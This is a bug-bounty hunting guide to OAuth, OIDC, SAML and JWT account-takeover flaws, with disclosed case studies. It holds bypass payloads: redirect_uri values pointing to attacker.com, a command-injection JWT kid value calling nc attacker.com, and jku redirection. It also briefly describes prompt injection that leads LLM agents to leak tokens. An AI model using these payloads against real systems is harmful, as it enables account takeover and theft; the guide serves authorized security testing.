- **Pattern 9: Multi-assertion XML where signature validates one node, identity reads from another.** Where to look: SAML response handling that uses different XML libraries for signature vs claim extraction (REXML/Nokogiri, lxml/xml.etree, libxml2/expat). Failure mode: Parser differential signature wrapping. Disclosed example: CVE-2025-25291/25292 ruby-saml (ahacker1 + p-, GHSL-2024-329/330, GitHub Security Lab).
- **Pattern 10: OIDC nonce not validated on subsequent calls.** Where to look: ID Token handler that reads nonce only on first auth flow, not on refresh / silent renew. Failure mode: ID Token replay / session fixation. Disclosed example: CVE-2024-10318 NGINX OIDC reference implementation.
- **Pattern 11: Mutable claim used as account key on Microsoft tokens.** Where to look: `preferred_username`, `upn`, `email` used instead of `oid`/`sub`. Failure mode: nOAuth across Entra tenants. Disclosed example: CVE-2024-21632 + Microsoft's xms_edov claim documentation update post-Descope.
- **Pattern 12: Scope upgrade via token exchange.** Where to look: `/oauth/token` accepts `scope=` parameter that's wider than what was approved at `/authorize`. Failure mode: Privilege escalation via scope expansion. Disclosed example: documented in Doyensec OAuth Common Vulnerabilities (Jan 2025), pattern present in multiple Salt Labs ChatGPT plugin findings.

## Bypass Techniques

- **Substring redirect_uri whitelist** — append host suffix `https://target.com.attacker.com/oauth/callback`. Bypass works when validator does `redirect_uri.contains("target.com")`. CVE-2024-52289 Authentik (regex `.` unescaped — Lukas Omegapoint disclosure February 2025), HackerOne #1212337 (bypass the fix of #1078283 due to poor validation), HackerOne #665651 (Stealing Users OAuth Tokens through redirect_uri parameter, $High).
- **Userinfo (@) bypass** — `https://target.com@attacker.com/oauth-callback`. RFC 3986 §3.2.1 — host parser confusion between browser and validator. Voorivex blog "Drilling the redirectUri in OAuth" (Oct 2024), HackTricks OAuth wiki, demonstrated against Apple OAuth provider.
- **IPv6 + userinfo combo** — `http://[::1]@[::1]@attacker.com/`. Google Cloud SDK redirect_uri impersonation by @weirdmachine HackerNoon May 2025 — defeated Google's parser-precision validation across multiple Google services.
- **IDN homograph** — Cyrillic `tаrget.com` (а=U+0430). Validation occurs on punycode form; browser navigates to Unicode. HackTricks OAuth wiki, also CVE-2018-7166 family Express path-to-regexp.
- **Path traversal in redirect_uri** — `https://booth.pm/users/auth/pixiv/callback/../../../../ja/items/<id>`. HackerOne #1861974 Pixiv $2,000 — Google Analytics on attacker's product page captures `code` from query string.
- **Wildcard subdomain takeover** — claim dangling `abandoned.target.com`, set `redirect_uri=https://abandoned.target.com/callback`. Pattern documented in HackTricks OAuth ATO wiki and routinely exploited; HackerOne corpus shows 4-figure to 5-figure payouts when chained to OAuth.
- **Open-redirect on whitelisted host** — set `redirect_uri=https://target.com/redirect?next=https://attacker.com`. AS validates target.com prefix → 302 chain to attacker. DEV.to lucky_lonerusher 2026 reports $15K paid; HackerOne #2828499 (open redirected by host header), HackerOne #2812583 (Tumblr redirect_to parameter Low → escalated).
- **Path-encoded bypass on fix** — `/..//logout?redirect=https://attacker.com` to bypass naive `^/logout` allowlist. HackerOne #3599248 (Bypass of Open Redirect Fix on lovable.dev via /..// Path Traversal) Medium 2026.
- **CRLF in redirect_uri** — `redirect_uri=https://target.com/callback%0d%0aLocation:%20https://attacker.com`. HackerOne #2147132 Mozilla bugzilla CRLF Header injection via redirect_uri (2023).
- **Custom scheme races (mobile)** — Android: malicious app registers `<intent-filter android:scheme="com.example.app" />` matching legit OAuth client. iOS: declares same URL Type. Without Universal Links / App Links, OS picks first match. Doyensec OAuth Common Vulnerabilities Jan 2025 documents the technique at https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html; also covered in OAuth 2.0 Security BCP RFC 9700 §4.5.4 disclosed via IETF.
- **Response-type/mode switching (Frans Rosén dirty dancing)** — `&response_type=code,id_token&response_mode=fragment`. Code lands in fragment instead of query → bypasses callback validation, exploitable via third-party JS that reads `location.hash`. Frans Rosén Detectify Labs July 2022 research disclosed at https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/, replicated against multiple Fortune 500 programs and presented at Sikkerhetsfestivalen Lillehammer 2022.
- **Browser swapping (SySS Jonas Primbs)** — initiate flow in attacker's browser, send incomplete URL to victim, victim's browser completes. Code is issued; client rejects state mismatch but doesn't invalidate code. SySS Tech Blog November 2025 disclosed at https://blog.syss.com/posts/browser_swapping/; Jonas Primbs presented at IETF 124 Montreal targeting OAuth 2.1 standardization.
- **PKCE downgrade by removing code_challenge** — initiate auth without `code_challenge` parameter; many clients silently accept. CVE-2024-23647 Authentik (BeyondTrust pattern), CVE-2024-22258 Spring Authorization Server (Confidential Clients only), Cloudflare CVE-2025-4144.
- **PKCE bypass via attacker-controlled URL** — iframe SSO, supply own code_challenge, capture code via MessagePort. Trace37 labs disclosed at https://labs.trace37.com/blog/pkce-bypass-oauth-account-takeover/ February 2026, demonstrated on large e-commerce platform via bug bounty program (amount undisclosed).
- **JWT alg=none case bypass** — `nOnE`, `NoNE`, `NULL`, `None` defeat string-equality `if alg=='none'` checks. CVE-2026-22817 Hono CVSS 8.2 family, also documented in IAMDevBox JWT confusion guide.
- **JWT RS256→HS256 algorithm confusion** — extract public key from JWKS, sign HS256 with PEM as secret. `jwt_tool -X k -pk public.pem`. CVE-2024-54150 cjwt (asymmetric key), CVE-2024-37568 Authlib HMAC verification with public key, milliesolem GitHub issue (Authlib #654).
- **JWT kid path traversal / SQLi / command injection** — `kid=../../../dev/null` (empty key), `kid=key' UNION SELECT 'attacker_key`, `kid=|nc attacker.com 4444`. PortSwigger Hacking JWT Tokens reference suite; multiple H1 disclosed reports in /tmp/reports_oauth.json corpus reference titles.
- **JWT jku / x5u redirection** — change `jku` to `https://attacker.com/jwks.json`. If JWKS URL not pinned to issuer, attacker controls signing key. PortSwigger Web Security Academy; multiple disclosed H1 reports.
- **Entra ID actor token cross-tenant impersonation** — craft outer token requesting victim app, embed legitimate inner token from attacker's free tenant in `actort` claim. CVE-2025-55241 Dirk-jan Mollema, Microsoft patched July 17 2025, CVE published September 4 2025; used legacy Azure AD Graph API.
- **SAML XSW (Signature Wrapping)** — wrap legit assertion in attacker's, copy original signature. SAML Raider Burp extension; multiple disclosed H1 reports including #356284 (Samlify XSW H1 2018), CVE-2025-46572 passport-wsfed-saml2, CVE-2025-47949 samlify (May 2025).
- **SAML parser-differential round-trip** — DOCTYPE with !ATTLIST that REXML and Nokogiri parse differently. CVE-2025-25291 ruby-saml (ahacker1 GHSL-2024-329 GitHub Security Lab); PortSwigger SAML Roulette by Gareth Heyes + Zakhar Fedotkin demonstrating unauthenticated GitLab admin (March 2025).

## Gate 0 Validation

Before writing the report, prove:

1. **Concrete demonstration**: minimum proof. For redirect_uri leak: capture victim's `code` in your exploit-server access log + screenshot of admin-panel access using exchanged token. For state-CSRF linking: screenshot of victim's account with attacker's IdP linked. For nOAuth: screenshot of victim's account dashboard accessed via attacker's Entra tenant. For JWT alg confusion: forged token + screenshot of admin endpoint returning 200 with admin-only data. For SAML wrapping: forged assertion + screenshot of admin login. **Never** dump `/etc/passwd`, never `cat /root/`, never read sensitive PII you don't need — trigger the auth and stop. Do not pivot; do not chain to data exfil; do not dump the user table. The minimum proof IS the bug.

2. **Business loss mapping**: customer PII / financial / credential / availability — pick one and quantify. nOAuth chain: "All N admins of any tenant on Entra-multi-tenant-app are accessible." OAuth ATO: "Any user who clicks an attacker URL is fully compromised — bypasses MFA, password reset, conditional access." MCP token theft: "Attacker accesses N downstream services the OAuth scope grants — list each (Salesforce read, GitHub repo read, Slack DM read)."

3. **Reproducibility in 10 minutes**: write the curl one-liner. For redirect_uri bypass: `curl -v "https://idp.target.com/oauth/authorize?client_id=X&redirect_uri=https://target.com.attacker.com/&response_type=code&state=Y"`. For state CSRF: provide CSRF PoC HTML page. For SAML wrapping: provide modified XML payload. For race condition: provide Turbo Intruder script. Triagers close anything they can't repro at lunch — make the repro one-page-max.

4. **Scope check**: target asset is in-scope for the program TODAY. Asset reachable now. Vuln present now. Re-test before submission. OAuth providers frequently silent-patch — what worked Tuesday is patched by Thursday. Always re-test the morning of submission.

5. **PoC artifacts**: 30-60 second screen recording (asciinema or mp4). Show the original auth flow → mutation → leaked code → exchanged token → privileged action. Burp request/response screenshots for each request: the auth request, the callback redirect, the token exchange. Curl one-liner in plain text. No edited videos.

If any of the 5 fails: **stop**. You have a finding, not a report.

## Top-Tier Hunter Decision Engine

OAuth/OIDC/SAML bugs pay when identity binding breaks. Before reporting, name the broken binding: `redirect_uri` to client, `state` to browser session, `code` to verifier, `token` to audience, `email` to verified tenant, `assertion` to signed element, or `scope` to downstream resource. If you cannot name the binding, you probably have protocol noise.

**Stop in 10 minutes** when the issue is missing-state without account linking, open redirect without OAuth reuse, JWT storage without XSS, or parser theory without a version match. **Keep chaining** when you can capture an authorization code, link attacker IdP to victim account, forge a token accepted by a second service, or impersonate across tenants. **Report immediately** when the proof reaches victim-session creation on your own second account or downstream OAuth token use; do not dump mailboxes, repos, or customer records.

**Minimum proof ceiling:** capture the code/token only for your test account, exchange it once, show the resulting session or one harmless privileged action, then stop. For SAML/JWT, include the original and modified assertion/token with secrets redacted. For MCP/OAuth, list scopes and one benign tool invocation rather than exfiltrating connected SaaS data.

## Real Impact Examples

**Example 1 — `redirect_uri-bypass` ($2,000 disclosed paid bounty, single-bug high-impact)**
- Setup: Pixiv's OAuth provider at `oauth.secure.pixiv.net/v2/auth/authorize` accepts `redirect_uri=https://booth.pm/users/auth/pixiv/callback` for the Booth.pm OAuth client (`a1Z7w6JssUQkw5Hid0uIDeuesue9`). Validation: `redirect_uri` must start with the registered prefix.
- Discovery: The hunter found that path-traversal segments in the URL (`/../../../../`) are not normalized before the prefix check. Setting `redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/<attacker_product_id>` was accepted. The traversal collapses on the browser side, so the victim is redirected to `https://booth.pm/ja/items/<attacker_product_id>` — a product page the attacker controls.
- Exploitation: Attacker created a public Booth shop, registered an item with Google Analytics tracking, then sent the crafted authorize URL to victims. Victim authenticates → IdP redirects to attacker's product page → product page's GA captures the `code` query parameter from the URL → attacker reads GA real-time reports → exchanges code → ATO.
- Impact: Account takeover for any Pixiv user who clicks the attacker's link. GA real-time reports give the code with sub-minute latency, well within the typical 10-minute code lifetime.
- Disclosed source: HackerOne report #1861974 "Stealing Users OAuth authorization code via redirect_uri" — disclosed publicly, $2,000 bounty paid by Pixiv. URL: https://hackerone.com/reports/1861974

**Example 2 — `dirty-dancing-postMessage-leak` ($10,000 paid bounty, multi-bug chain)**
- Setup: Reddit's "Sign in with Apple" OAuth flow lands on `accounts.reddit.com` after Apple authentication. The post-OAuth landing page contains a third-party JS gadget that reads `location.href` and posts it to a parent window via postMessage with no origin check.
- Discovery: Frans Rosén (Detectify) was researching response_type/response_mode switching against Apple's IdP. By switching `response_type=code` to `response_type=code,id_token`, the `id_token` was forced into the URL fragment. The Reddit callback page didn't validate the unexpected response_type, but the third-party script in the page did read `location.href` and broadcast it via postMessage.
- Exploitation: Attacker opens `accounts.reddit.com/oauth/sign_in_with_apple` with switched response_type in a popup window. Attacker's parent page calls `window.opener.addEventListener('message', e => leak(e.data))`. Victim's authentication completes, third-party script broadcasts the URL containing `id_token` and `code`, attacker captures both, exchanges for full account access.
- Impact: One-click account takeover of any Reddit user with Apple Sign-in linked. No interaction beyond clicking the malicious link.
- Disclosed source: HackerOne Reddit program; writeup published August 2022 by Roberto on InfoSec Write-ups, $10,000 bounty disclosed, Frans Rosén's full research at "Account hijacking using 'dirty dancing' in sign-in OAuth-flows" (Detectify Labs blog, July 2022).

**Example 3 — `ruby-saml-parser-differential` (low five-figure to mid-five-figure private bounty range, OSS supply-chain CVE-replay)**
- Setup: GitHub Security Lab opened a private bug bounty engagement to evaluate ruby-saml security after their internal CVE-2024-9487 (encrypted assertions) and ahacker1's earlier CVE-2024-45409 (auth bypass). Selected researchers (ahacker1, Peter Stöckli, p-) had access to GitHub test environments using ruby-saml.
- Discovery: ruby-saml uses two XML parsers — REXML for signature validation, Nokogiri for attribute extraction. ahacker1 found DOCTYPE-based parser differential (CVE-2025-25291, GHSL-2024-329); p- independently found namespace-based parser differential (CVE-2025-25292, GHSL-2024-330). Same root cause, different exploitation primitive. The hunter only needs *any* legitimately signed SAML assertion from the target IdP — not necessarily admin's.
- Exploitation: Craft SAMLResponse with DOCTYPE `<!ATTLIST>` injection so REXML validates signature on a "real" assertion (with attacker's NameID) while Nokogiri reads attributes from an attacker-injected node — or namespace confusion where each parser reads a different `<ds:Signature>` element. Replace NameID with admin's identifier.
- Impact: PortSwigger's Gareth Heyes + Zakhar Fedotkin demonstrated unauthenticated administrator access on GitLab Enterprise via the same ruby-saml chain. SaaS-style impact: any organization using ruby-saml SAML SSO is fully bypassable with a single legitimately-signed assertion.
- Disclosed source: CVE-2025-25291 + CVE-2025-25292, GHSL-2024-329 + GHSL-2024-330 (GitHub Security Lab advisory by Peter Stöckli, Sep 2025), PortSwigger SAML Roulette by Gareth Heyes (March 2025), GitLab patch releases 17.9.2/17.8.5/17.7.7 (March 2025). Engagement was a paid private bug bounty — exact dollar amount undisclosed but classified as "blockbuster" by GitHub blog post.

**Example 4 — `MCP-OAuth-PKCE-downgrade` (low five-figure range, cloud-native/CI/CD)**
- Setup: Cloudflare workers-oauth-provider library is the OAuth implementation used for Model Context Protocol (MCP) servers built on Cloudflare Workers. Powers Cloudflare's official MCP servers and many third-party MCP deployments.
- Discovery: The Cloudflare team's own audit (and external Google Security Research disclosure GHSA-2h78-5wx8-jccc) found three issues: missing redirect_uri validation on `/authorize` (CVE-2025-4143), PKCE downgrade where `code_verifier` was accepted in token exchange even when no `code_challenge` was sent in authorization (CVE-2025-4144), and CSRF + open redirect via the `state` parameter that base64-encoded the redirectUri without integrity protection.
- Exploitation: Attacker crafts authorization URL with `redirect_uri=https://attacker.com/callback` and no `code_challenge`. Victim (logged into the MCP server) clicks the link — auto-approve consent fires (because previously authorized). MCP authorization code lands at attacker.com. Attacker exchanges code at `/token` with arbitrary `code_verifier` (PKCE downgrade). Receives MCP access token. Invokes any MCP tool the victim's scope authorizes — including database queries, API tokens, repo content.
- Impact: Account takeover on any MCP server using workers-oauth-provider < 0.0.5; lateral movement to all downstream services the OAuth scope grants. Cloudflare's own MCP servers were affected; downstream MCP server developers all needed to upgrade.
- Disclosed source: CVE-2025-4143 (GHSA-4pc9-x2fx-p7vj), CVE-2025-4144 (GHSA-qgp8-v765-qxx9) — Cloudflare advisories May 1 2025; GHSA-2h78-5wx8-jccc — Google Security Research advisory Dec 15 2025 (CSRF via state). Cloudflare runs an internal bounty program; exact amounts undisclosed, but the class spawned multiple downstream MCP server CVEs (e.g., FastMCP GHSA-5h2m-4q8j-pqpj) with low-five-figure rough range based on the criticality of the affected ecosystem.

**Example 5 — `Entra-actor-token-cross-tenant` (Microsoft Bug Bounty, undisclosed but documented "Critical Severity" payout, single-bug catastrophic)**
- Setup: Microsoft Entra ID's legacy Azure AD Graph API supported "actor tokens" via the `actort` claim — a service-to-service token-exchange mechanism from the OBO (On-Behalf-Of) flow. Validation was supposed to ensure the actor token came from the same tenant as the outer token.
- Discovery: Dirk-jan Mollema discovered that Entra ID was incorrectly checking the identity of the impersonator instead of the application being accessed. By crafting an outer token (requesting access to a victim tenant's SharePoint with the victim user's `oid`) and embedding a legitimate inner token from the attacker's own free Entra tenant in the `actort` claim, the Azure AD Graph API accepted the request.
- Exploitation: Register a free Entra ID tenant. Generate a service-to-service actor token from your tenant's Access Control Service (ACS). Craft outer token with victim's User Object ID and target application (SharePoint Online, Microsoft Graph). Use the legacy Azure AD Graph endpoint to exchange — get back a session token impersonating any user in any other tenant.
- Impact: Cross-tenant impersonation of any user in any organization on Entra ID, including Global Administrators. Bypasses MFA, Conditional Access, all controls. No audit trail by default. Mollema demonstrated against arbitrary tenants — full Microsoft Cloud takeover at scale.
- Disclosed source: CVE-2025-55241 (NVD, CVSS 10.0); reported July 14 2025 by Dirk-jan Mollema; patched by Microsoft July 17 2025; CVE published September 4 2025. Microsoft Bug Bounty program payout undisclosed but classified as "Critical Severity" tier (Microsoft Identity bounty: up to $100,000 per Critical, see https://www.microsoft.com/en-us/msrc/bounty-microsoft-identity).

**Example 6 — `nOAuth-cross-tenant-account-takeover` (low five-figure paid range, OAuth identity-confusion class)**
- Setup: An open-source Ruby OAuth library `omniauth-microsoft_graph` (Recognize.app maintainer `synth`) wrapped Microsoft Graph as an OmniAuth strategy. The mapping logic populated `User.email` directly from the `email` claim returned by Entra ID without ever checking `email_verified` or the (then non-existent) `xms_edov` claim. Downstream apps using the OmniAuth strategy keyed account lookup on email.
- Discovery: Descope's Omer Cohen (during nOAuth research disclosed June 20 2023 at https://www.descope.com/blog/post/noauth) observed that Microsoft Entra ID — uniquely among major IdPs — emits the `email` claim *unverified* and *mutable* from any tenant. Combined with apps using email as account key, this collapses to a one-click cross-tenant ATO. The OmniAuth Microsoft Graph strategy was the canonical disclosed example, tracked as CVE-2024-21632 / GHSA-5g66-628f-7cvj.
- Exploitation: Attacker registers a free Entra ID tenant via free.azure.microsoft.com. In Azure portal → Users → New User → Contact Information, sets the `mail` attribute to the victim's email address (no domain verification required for the attribute itself). Logs into the target application via "Sign in with Microsoft" → ID token contains attacker-controlled `email` claim → app's `User.find_by(email: claim.email)` returns the victim's existing account → attacker is logged in as victim, with full session including any admin scope the victim had.
- Impact: Full account takeover of any user on any application that used `omniauth-microsoft_graph < 2.0.0` and keyed by email. Bypasses MFA, password rotation, and all conditional access policies — the victim never sees a notification because the attacker logs in via an entirely separate IdP path. Semperis testing in June 2025 found 9% of Entra Gallery apps still vulnerable (~15,000 SaaS apps estimated).
- Disclosed source: CVE-2024-21632, GHSA-5g66-628f-7cvj (https://github.com/synth/omniauth-microsoft_graph/security/advisories/GHSA-5g66-628f-7cvj), Descope nOAuth disclosure June 20 2023 (https://www.descope.com/blog/post/noauth) — Descope earned $75K+ in coordinated bug bounties across multiple disclosed programs; Recognize.app maintained the omniauth-microsoft_graph library; HackerOne Microsoft Bug Bounty program contributed to the coordinated fix that introduced the `xms_edov` claim and `removeUnverifiedEmailClaim` flag.

## Anti-Targets / What's Dead

The kill-list. Where NOT to point the cannon.

- **Standalone "missing state parameter" without account-link** — closed Informative on every mature program unless you can demonstrate the CSRF actually links accounts (test on a target with a "Connect Google/GitHub" feature that already has a victim account; if not chainable, don't submit). Won't pay since circa 2023 on H1/Bugcrowd top-tier programs because triagers know it requires victim interaction with a long predictable link.
- **Standalone "open redirect on /logout" without OAuth chain** — every program kills these as Low. Unless you find the OAuth flow on the same host AND chain to token theft, do not submit. DEV.to lucky_lonerusher 2026 explicitly disclosed bug bounty program range at https://dev.to/lucky_lonerusher/open-redirect-to-account-takeover-the-exploit-chain-most-hunters-miss-in-2026-3j1g: "filed standalone, would have paid $150." With chain: $15K.
- **alg=none on libraries that explicitly reject it** — modern jsonwebtoken (≥4.2.2), PyJWT (≥1.5.0), jose-rs/jose-jwt have rejected alg=none by default for years. Don't bother testing alg=none unless the JWT library is custom or pre-2018. Pivot to RS256→HS256 confusion, kid injection, jku redirection — those still pay.
- **Liferay OAuth `/c/portal/json_service` family** — patched everywhere post-CVE-2020-7961. Don't waste cycles unless you find an unpatched 7.0.x install on an internal corporate intranet.
- **CSRF on OAuth linking when state IS present and validated** — the bug *is* the absence of state; if state exists and matches between auth init and callback, the CSRF doesn't work. Don't submit "I removed state and it broke" — that's expected behavior.
- **"Sign in with Apple" without Reddit-style postMessage gadget** — Frans Rosén $10K (disclosed via HackerOne Reddit program at https://infosecwriteups.com/this-is-how-he-could-hijack-reddit-accounts-with-just-one-click-a-10-000-bug-bounty-7fd8d54d5582) worked because Reddit had a third-party JS leak gadget. Apple's IdP correctly handles redirect_uri. Without a leak gadget on the SP side, there's no chain. Don't theorycraft "Apple OAuth could be vulnerable" — show the gadget.
- **Theoretical SAML signature wrapping without library version match** — modern python3-saml ≥1.16.0, ruby-saml ≥1.18.0, simplesamlphp ≥2.x have parser-differential mitigations. Don't submit "if their library was vulnerable, this would be a bug." Confirm the library and version first via response Server header, JS bundle inspection, or known fingerprints.
- **OAuth implicit flow on web apps without third-party JS** — implicit flow is deprecated in OAuth 2.1 and most apps disabled it post-2022. Even if enabled, without a third-party script reading `location.hash`, the token isn't reachable to attacker. Don't submit "implicit flow is enabled" alone — show the leak.
- **JWT in localStorage as a finding** — it's a best-practice violation, not a vulnerability. Triagers close it Self. Submit only when chained to XSS that actually reads it.
- **Self-XSS → OAuth ATO** — Self-XSS doesn't deliver to victims. Don't submit unless you have a UXSS, browser CVE, or postMessage origin chain that delivers the XSS to a victim's session.
- **Microsoft consent-screen "this app wants access to your email" as a vuln** — consent flows are working as intended. Submit only if you find a *bypass* (no consent screen shown, or wrong scope shown — Salt Labs ChatGPT plugin pattern is the model).
- **CORS on `/oauth/userinfo` with `Origin: null` + `Access-Control-Allow-Credentials: true`** — only matters if the program in scope explicitly excludes API-level CORS as a finding type. Grab paid for it (H1 #3631550), but not all programs do — read the program scope page first.

## Modern Expansion Pack

OAuth/OIDC/SAML/JWT applies across the 2024-2026 expansion topics. The validator looks for at least 4 of 5.

1. **Container escape** — relevant via *workload identity* and *projected service-account tokens*. CVE-2024-21626 runc Leaky Vessels lets a pod escape to host; on host the kubelet TLS cert + service-account tokens become accessible, and any pod's projected OIDC token (audience `kubernetes.io`) can be exfiltrated. Combined with CVE-2024-23653 BuildKit GRPC SecurityMode missing privilege check (build-time escape), the exfiltrated tokens enable downstream cluster pivot. NVIDIA Container Toolkit (CVE-2024-0132 TOCTOU, Wiz Research) similarly grants host access from GPU pods, exposing OIDC trust to AWS/GCP for IRSA pod identity.

2. **ML serving / inference** — model registries and inference servers use OAuth tokens for tool integration and dataset retrieval. BentoML pickle deserialization (CVE-2025-27520 critical, c2an1 disclosure via Snyk) on `/summarize` endpoint accepts unauthenticated requests with `Content-Type: application/vnd.bentoml+pickle`; if the model server's OAuth token (for downstream registry, MLflow, S3) is reachable in process memory, RCE exfiltrates it. MLflow path traversal family (CVE-2024-1560/1483/1594, all via Huntr) exposes model registry credential files. TorchServe and Triton Inference Server have similar OAuth-token-on-disk patterns.

3. **Agentic LLM tool-use** — the dominant 2025-2026 OAuth attack surface. CVE-2025-68613 (LangChain `langchain-experimental` PythonREPLTool / PandasDataFrameAgent CVSS 9.8 critical) is the new attack class — indirect prompt injection in CSV/text/RAG context coerces the agent into writing exec()-able Python. The agent's OAuth tokens (for connected MCP servers, Salesforce, GitHub) are then exfiltrated via tool output. CVE-2025-49596 (Anthropic MCP Inspector unauth RCE) and CVE-2025-6514 (mcp-remote OAuth URL command injection, 558K downloads) directly compromise the OAuth client side. CVE-2026-21852 (Claude Code MCP RCE per Check Point Research) shows the malicious MCP server pattern. PolicyLayer's Supabase MCP exfiltration via tool chaining (General Analysis July 2025) and GitHub MCP prompt injection via issues (Invariant Labs May 2025) demonstrate the *cross-trust-boundary token reuse* pattern: a single OAuth token granted to the MCP server spans multiple downstream systems with no per-tool scope binding.

4. **Modern JS RSC / Server Actions** — React Server Components / Next.js App Router OAuth callback handlers run on the *backend* now. CVE-2025-66478 / CVE-2025-55182 React2Shell (CVSS 10.0, Lachlan Davidson disclosure November 29 2025, Meta Bug Bounty) means any OAuth callback handler implemented as a Server Action endpoint inherits remote code execution if React 19.0/19.1.0/19.1.1/19.2.0 packages are unpatched. Vercel maintains a separate H1 program paying for WAF bypasses against this CVE. CVE-2025-55183 (Server Actions Source Code Exposure) leaks compiled Server Function source, including OAuth client_secrets accessed from environment variables. Hunt Next.js OAuth callback at `/api/auth/callback/<provider>` and `/oauth/callback` route handlers — these are React Server Function endpoints under App Router and inherit the React deserialization bug.

5. **GitOps / K8s admission** — CVE-2025-55190 Argo CD project token leak (CVSS 7.7, GHSA-786q-9hcg-v9ff) exposes repository credentials including OAuth tokens to any project-scoped API token. CVE-2026-23990 Flux Operator empty-claims OIDC bypass (GHSA-4xh5-jcj2-ch8q) lets requests run as the operator service account. CVE-2026-40161 Tekton git resolver token exfil (GHSA-wjxp-xrpv-xpff) leaks the system Git API token (PAT, GitLab token) to attacker-controlled `serverURL`. CVE-2025-1974 ingress-nginx admission controller RCE (CVSS 9.8) — any pod-network attacker reads cluster-wide Secrets including OAuth tokens. The pattern: GitOps controllers consume OIDC for human auth and use long-lived service tokens for machine actions; mixing these scopes loses the human's scope-restriction.

## Notes for the hunter

**24-month meta call-out (what's changing right now):** OAuth 2.1 spec adoption (PKCE mandatory, implicit flow deprecated, response_type=token forbidden) is finally arriving in production via the MCP spec mandate (2025-11-25). This *removes* some legacy bugs (no more dirty-dancing fragment leaks if implicit is gone) but *adds* new ones — every developer wiring OAuth 2.1 for MCP is making the PKCE downgrade mistake (CVE-2025-4144, CVE-2024-23647, CVE-2024-22258) because the spec text isn't crystal-clear on what "PKCE required" means at the validation layer. Simultaneously, parser-differential bugs are eating SAML libraries (CVE-2025-25291/25292, CVE-2025-46572, CVE-2025-47949 in 2025 alone) — every SAML library that uses two XML parsers internally is suspect. nOAuth is *still* the biggest in-the-wild cross-tenant attack surface (15,000+ vulnerable SaaS apps per Semperis June 2025); Microsoft can't fix the apps, only document the mitigation.

**OSS targets where the next 6 months of paying bugs likely are:**
- `samlify` (npm, 80K+ weekly downloads, recent CVE-2025-47949)
- Every MCP server framework: `fastmcp`, `mcp-remote`, `@modelcontextprotocol/server-*`, custom Workers-based providers (CVE-2025-4143/4144 cluster)
- `next-auth` / `@auth/core` and downstream providers when integrating new IdPs (frequent state/redirect_uri bugs)
- Custom JWT verification in edge runtimes — Hono CVE-2026-22817/22818 set the template; Bun, Deno, Cloudflare Workers JWT libs all suspect
- `omniauth-*` strategies for emerging providers (Patreon GHSA-f6qq-3m3h-4g42 hardcoded same user ID for every Patreon login is a 2026 example of "new provider, classic class of bug")
- `python-jose`, `pyJWT`, `Authlib` — recent disputes/CVEs show ongoing alg confusion (CVE-2025-61152, CVE-2024-37568)
- Nhost/Supabase/Clerk-style hosted auth providers as they add CIMD, RFC 8693 token exchange, RFC 8707 resource indicators — all new spec features = new bugs

**Anti-patterns reminder (this class is NOT):**
- A "missing state" finding alone (need account-link demonstration)
- An open redirect alone (need OAuth chain on same host)
- A theoretical bypass (need PoC against real victim user)
- A scope/consent screen complaint (need actual bypass)
- "I see JWT in localStorage" (need XSS that reads it)
- "App uses implicit flow" (need leak gadget)
- A SAML "signature could be wrapped" (need library version match + working PoC)

**Closing thought:** OAuth/OIDC/SAML/JWT are the most heavily-tested security protocols in existence yet still produce blockbuster bugs every quarter (CVE-2025-25291 ruby-saml, CVE-2025-55241 Entra ID actor token, CVE-2026-22817 Hono). The reason: the *protocol* is sound but the *implementation surface* is enormous — every endpoint, every claim, every parser, every redirect path is a separate validation logic that has to get right. Hunt the seams: where two parsers meet, where two libraries meet, where authorization ends and authentication begins, where the human flow ends and the machine flow begins. The next CVE is at the boundary you haven't tested yet.

## Top-Tier Operating Manual

**90-minute hunt loop**
1. 0-10 min: draw the auth flow. Identify client, authorization server, resource server, callback, token endpoint, userinfo endpoint, account-link endpoint, and logout endpoint.
2. 10-25 min: collect binding parameters: `redirect_uri`, `state`, `nonce`, `code_challenge`, `code_verifier`, `client_id`, `aud`, `iss`, `sub`, `email`, `kid`, `jku`, `RelayState`, `SAMLResponse`.
3. 25-45 min: test redirect and state binding. Try path confusion, open-redirect reuse, wildcard subdomain, state swap, account linking CSRF, and response-mode switching.
4. 45-60 min: test token binding. Try code reuse, PKCE downgrade, audience confusion, issuer confusion, nOAuth email confusion, and JWT algorithm confusion.
5. 60-75 min: test parser boundary. For SAML, look for two-parser libraries, encrypted assertion handling, namespace confusion, and wrapped assertion extraction.
6. 75-90 min: prove one victim-session outcome on your second account and stop.

**Decision tree**
- If missing `state` cannot link or login a victim account, kill.
- If open redirect is not on an allowed redirect host, kill or move to takeover.
- If redirect bypass captures a code, exchange it once for your test account and report.
- If JWT forgery works for one service, test one adjacent service for shared trust.
- If SAML parser differential is suspected, confirm library version before crafting XML.
- If nOAuth is suspected, use a free tenant and prove email-claim account collision against your second account.

**False-positive graveyard**
- OAuth consent phishing: kill unless consent screen lies or scope binding breaks.
- JWT in localStorage: kill unless paired with XSS.
- Implicit flow enabled: kill unless a same-origin leak gadget reads the fragment.
- Missing nonce in non-OIDC OAuth: kill unless ID token replay is in play.
- SAML metadata public: kill unless signing/encryption trust can be subverted.
- Logout CSRF: usually low unless it forces account linking or session fixation.

**Program economics**
- Cross-tenant identity confusion is the highest-value OAuth class.
- OAuth redirect chains pay when they produce code/token theft, not when they merely redirect.
- SAML signature bypasses are premium because enterprises rely on SSO as a security boundary.
- MCP OAuth is hot because tokens map to downstream tools, repos, databases, and SaaS APIs.
- JWT confusion pays more when one forged token works across multiple services.

**Report framing**
- Weak: "The OAuth flow has an open redirect."
- Strong: "The authorization server accepts a redirect URI that passes prefix validation before browser normalization. The victim's authorization code lands on an attacker-controlled page and is exchangeable for a valid session on my second account."
- Expected pushback: "Victim interaction required." Rebuttal: "OAuth account-takeover chains are one-click by design; the security guarantee is that the code returns only to a registered client, which this bypass breaks."
- Expected pushback: "The code expires quickly." Rebuttal: "The exploit captures the code in real time and exchanges it within seconds, as shown in the access log timestamp."

**Automation harness**
- Store each flow as HAR plus `flow.json`: authorize URL, callback URL, token request, userinfo request, account-link request.
- Generate redirect variants automatically: encoded dots, slashes, backslashes, fragments, userinfo, punycode, path traversal, open-redirect nesting.
- For PKCE, test absent challenge, changed verifier, reused verifier, and method downgrade.
- For JWT, run alg, kid, jku, jwks, aud, iss, exp, nbf, and case-normalization tests.
- For SAML, keep a local lab IdP/SP pair so parser payloads are validated before touching target.
